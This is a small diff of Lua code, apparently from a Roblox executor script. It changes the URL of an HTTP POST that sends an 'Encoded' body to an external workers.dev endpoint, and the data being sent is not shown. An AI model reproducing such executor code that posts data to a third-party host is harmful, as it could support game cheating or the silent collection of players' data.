@@ -59,7 +59,7 @@ end
 local httprequest = httprequest or http_request or request or HttpPost or (http and http.request) or (syn and syn.request)
 if httprequest then
     local Response = httprequest({
-        Url = "https://service.nikoleto.workers.dev/combatcc",
+        Url = "https://service.nikoleto.workers.dev/duelwarriorshub",
         Body = Encoded,
         Method = "POST",
         Headers = {
